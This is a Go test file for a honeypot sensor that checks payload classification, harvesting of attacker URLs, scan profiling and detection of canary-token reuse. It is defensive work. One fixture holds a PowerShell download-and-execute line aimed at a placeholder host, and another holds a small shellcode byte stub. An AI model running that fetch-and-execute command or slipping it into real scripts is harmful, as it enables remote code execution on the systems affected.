package sensor

import (
	"bytes"
	"testing"
	"time"

	"github.com/rom/tarpit-honeypot/internal/event"
	"github.com/rom/tarpit-honeypot/internal/scananalysis"
	"github.com/rom/tarpit-honeypot/internal/tokentrack"
)

func hasAnomaly(ev *event.Event, want string) bool {
	for _, a := range ev.Anomalies {
		if a == want {
			return true
		}
	}
	return false
}

// A magic-confirmed executable in the captured payload yields a
// Critical malware:capture event and enriches the source event.
func TestObservePayloadELFCritical(t *testing.T) {
	s := &Sensor{name: "t"} // payloads nil: classify + emit, don't persist
	elf := append([]byte{0x7f, 'E', 'L', 'F', 2, 1, 1, 0}, bytes.Repeat([]byte{0}, 64)...)
	ev := &event.Event{ID: "e1", RuleID: "listener:http", Handler: "http", Proto: "tcp", Source: event.Endpoint{IP: "1.2.3.4"}}
	mw := s.observePayload(ev, elf)
	if mw == nil {
		t.Fatal("expected a malware:capture event")
	}
	if mw.RuleID != "malware:capture" || mw.Severity != event.SeverityCritical {
		t.Errorf("got rule=%q sev=%v; want malware:capture/critical", mw.RuleID, mw.Severity)
	}
	if !hasAnomaly(ev, "payload-elf") {
		t.Errorf("source event not enriched with payload-elf: %v", ev.Anomalies)
	}
	if ev.Meta["payload_artifacts"] == nil {
		t.Error("payload_artifacts meta missing")
	}
}

// The shellcode heuristic stays High (not Critical) to avoid alert
// fatigue from the occasional binary-protocol false positive.
func TestObservePayloadShellcodeHigh(t *testing.T) {
	s := &Sensor{name: "t"}
	sled := append(bytes.Repeat([]byte{0x90}, 32), 0x31, 0xc0, 0xcd, 0x80)
	ev := &event.Event{ID: "e2", RuleID: "listener:raw", Proto: "tcp", Source: event.Endpoint{IP: "1.2.3.4"}}
	mw := s.observePayload(ev, sled)
	if mw == nil {
		t.Fatal("expected a malware:capture event for shellcode")
	}
	if mw.Severity != event.SeverityHigh {
		t.Errorf("shellcode severity = %v; want high", mw.Severity)
	}
}

// IOCs typed into the emulated shell (not in the connection payload) are
// harvested from the command meta; no artifact => no separate event.
func TestObservePayloadHarvestsShellURLs(t *testing.T) {
	s := &Sensor{name: "t"}
	ev := &event.Event{
		ID: "e3", RuleID: "listener:ssh", Handler: "ssh_interactive", Source: event.Endpoint{IP: "1.2.3.4"},
		Meta: map[string]any{"shell_commands": []string{
			"IEX (New-Object Net.WebClient).DownloadString('http://evil.example/a.ps1')",
		}},
	}
	if mw := s.observePayload(ev, nil); mw != nil {
		t.Errorf("URL-only finding should not emit a malware event; got %v", mw.RuleID)
	}
	urls, _ := ev.Meta["harvested_urls"].([]string)
	if len(urls) == 0 || urls[0] != "http://evil.example/a.ps1" {
		t.Errorf("shell-command URL not harvested: %v", ev.Meta["harvested_urls"])
	}
}

func TestObservePayloadBenignNoEvent(t *testing.T) {
	s := &Sensor{name: "t"}
	ev := &event.Event{ID: "e4", RuleID: "listener:http", Source: event.Endpoint{IP: "1.2.3.4"}}
	req := []byte("GET / HTTP/1.1\r\nHost: x\r\n\r\n")
	if mw := s.observePayload(ev, req); mw != nil {
		t.Errorf("benign request should not emit malware:capture; got %v", mw)
	}
}

// observeScan emits a scananalysis:profile once a source crosses the
// connection threshold.
func TestObserveScanEmitsProfile(t *testing.T) {
	s := &Sensor{name: "t", scanTrack: scananalysis.NewTracker(5 * time.Minute)}
	base := time.Unix(1_700_000_000, 0)
	ports := []int{80, 443, 22, 21, 8080, 3306}
	var got *event.Event
	for i := 0; i < scananalysis.MinConnsForVerdict; i++ {
		ev := &event.Event{
			RuleID: "listener:bait", Handler: "http", Proto: "tcp",
			Source: event.Endpoint{IP: "203.0.113.9"}, Dest: event.Endpoint{Port: ports[i]},
			Time: base.Add(time.Duration(i) * 40 * time.Millisecond),
		}
		if e := s.observeScan(ev, nil); e != nil {
			got = e
		}
	}
	if got == nil || got.RuleID != "scananalysis:profile" {
		t.Fatalf("expected scananalysis:profile; got %v", got)
	}
	if got.Meta["distinct_ports"] != len(ports) {
		t.Errorf("distinct_ports = %v; want %d", got.Meta["distinct_ports"], len(ports))
	}
}

// Non-listener events are ignored by scan analysis.
func TestObserveScanIgnoresNonListener(t *testing.T) {
	s := &Sensor{name: "t", scanTrack: scananalysis.NewTracker(time.Minute)}
	ev := &event.Event{RuleID: "device:new", Source: event.Endpoint{IP: "203.0.113.9"}}
	if e := s.observeScan(ev, nil); e != nil {
		t.Errorf("non-listener event should be ignored; got %v", e)
	}
}

func TestObserveTokensDetectsReuse(t *testing.T) {
	s := &Sensor{name: "t", tokenTrack: tokentrack.New(0)}
	t0 := time.Now().UTC()

	// 1) Serve a synthetic vault token to attacker A — recorded, no finding.
	served := &event.Event{
		Time: t0, RuleID: "listener:vault:request", Handler: "vault",
		Source: event.Endpoint{IP: "203.0.113.10"},
		Meta:   map[string]any{"vault_token": "Kp9mZq3vR7wLs1xN"},
	}
	if tu := s.observeTokens(served); tu != nil {
		t.Fatalf("serving a token should not itself fire token_used: %+v", tu)
	}

	// 2) Later, attacker B authenticates somewhere using that exact token.
	reused := &event.Event{
		Time: t0.Add(time.Hour), RuleID: "listener:ssh:auth", Handler: "ssh",
		Source: event.Endpoint{IP: "198.51.100.4"},
		Meta:   map[string]any{"auth_password": "Kp9mZq3vR7wLs1xN"},
	}
	tu := s.observeTokens(reused)
	if tu == nil {
		t.Fatal("reuse of a served token should fire canary:token_used")
	}
	if tu.RuleID != "canary:token_used" || tu.Severity != event.SeverityCritical {
		t.Errorf("wrong finding: rule=%s sev=%v", tu.RuleID, tu.Severity)
	}
	if tu.Meta["minted_handler"] != "vault" {
		t.Errorf("mint context lost: %+v", tu.Meta)
	}
}

func TestObserveTokensIgnoresSameConnectionEcho(t *testing.T) {
	s := &Sensor{name: "t", tokenTrack: tokentrack.New(0)}
	t0 := time.Now().UTC()
	// An event that both serves and (in the same connection/time) echoes the
	// token must not self-trigger.
	ev := &event.Event{
		Time: t0, RuleID: "listener:vault:request", Handler: "vault",
		Source: event.Endpoint{IP: "203.0.113.10"},
		Meta:   map[string]any{"vault_token": "Kp9mZq3vR7wLs1xN", "auth_password": "Kp9mZq3vR7wLs1xN"},
	}
	if tu := s.observeTokens(ev); tu != nil {
		t.Errorf("same-connection echo should not fire token_used: %+v", tu)
	}
}
